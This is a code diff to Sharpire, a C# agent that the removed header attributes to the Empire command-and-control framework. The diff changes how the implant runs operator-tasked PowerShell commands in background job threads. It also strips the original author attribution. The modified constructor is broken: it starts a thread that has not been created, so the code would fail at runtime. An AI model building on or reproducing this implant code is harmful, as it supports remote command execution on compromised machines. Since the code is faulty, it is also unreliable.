@@ -1,8 +1,4 @@
-﻿// Original Author: 0xbadjuju (https://github.com/0xbadjuju/Sharpire)
-// Updated and Modified by: Jake Krasnov (@_Hubbl3)
-// Project: Empire (https://github.com/BC-SECURITY/Empire)
-
-using System;
+﻿using System;
 using System.Collections.Generic;
 using System.Collections.ObjectModel;
 using System.Management.Automation;
@@ -93,39 +89,41 @@ namespace Sharpire
             return jobResults;
         }
 
-        internal string StartAgentJob(string command, ushort taskId)
+        internal void StartAgentJob(string command, ushort taskId)
         {
-            Random random = new Random();
-            string characters = "ABCDEFGHKLMNPRSTUVWXYZ123456789";
-            char[] charactersArray = characters.ToCharArray();
-            StringBuilder sb = new StringBuilder(8);
-            for (int i = 0; i < 8; i++)
-            {
-                int j = random.Next(charactersArray.Length);
-                sb.Append(charactersArray[j]);
-            }
-
-            string id = sb.ToString();
+            string taskIdString = taskId.ToString();
             lock (jobs)
             {
-                jobs.Add(id, new Job(command));
+                if (jobs.ContainsKey(taskIdString))
+                {
+                    jobs[taskIdString].UpdateCommand(command);
+                }
+                else
+                {
+                    jobs.Add(taskIdString, new Job(command));
+                }
             }
             lock (jobsId)
             {
-                jobsId.Add(id, taskId);
+                if (!jobsId.ContainsKey(taskIdString))
+                {
+                    jobsId.Add(taskIdString, taskId);
+                }
             }
-            return id;
         }
 
         public class Job
         {
             private Thread JobThread { get; set; }
-            private static string output = "";
-            private static bool isFinished = false;
+            private string output = "";
+            private bool isFinished = false;
             public string Status { get; set; }
             public string Language { get; set; }
             public Thread Thread { get; set; }
             public PowershellDetails Powershell { get; set; }
+            private readonly object syncLock = new object();
+            private string command;
+
 
             public Job()
             {
@@ -135,11 +133,33 @@ namespace Sharpire
             public Job(string command)
             {
                 Status = "running";
+                this.command = command;
+                JobThread.Start();
+            }
+
+            private void StartJob()
+            {
                 JobThread = new Thread(() => RunPowerShell(command));
                 JobThread.Start();
             }
 
-            public static void RunPowerShell(string command)
+            public void UpdateCommand(string newCommand)
+            {
+                lock (syncLock)
+                {
+                    // Update the command
+                    command = newCommand;
+
+                    // Restart the job
+                    if (JobThread != null && JobThread.IsAlive)
+                    {
+                        JobThread.Abort();
+                    }
+                    StartJob();
+                }
+            }
+
+            public void RunPowerShell(string command)
             {
                 using (Runspace runspace = RunspaceFactory.CreateRunspace())
                 {
@@ -173,11 +193,11 @@ namespace Sharpire
                         }
                         finally
                         {
-                            lock (output)
+                            lock (syncLock)
                             {
                                 output = sb.ToString();
+                                isFinished = true;
                             }
-                            isFinished = true;
                         }
                     }
                 }
@@ -185,31 +205,40 @@ namespace Sharpire
 
             public bool IsCompleted()
             {
-                if (null != JobThread)
+                lock (syncLock)
                 {
-                    if (true == isFinished)
+                    if (JobThread != null)
+                    {
+                        if (isFinished)
+                        {
+                            Status = "completed";
+                            return true;
+                        }
+                        return false;
+                    }
+                    else
                     {
                         Status = "completed";
                         return true;
                     }
-                    return false;
-                }
-                else
-                {
-                    Status = "completed";
-                    return true;
                 }
             }
 
             public string GetOutput()
             {
-                return output;
+                lock (syncLock)
+                {
+                    return output;
+                }
             }
 
             public void KillThread()
             {
-                JobThread.Abort();
-                Status = "stopped";
+                if (JobThread != null)
+                {
+                    JobThread.Abort();
+                    Status = "stopped";
+                }
             }
         }
 
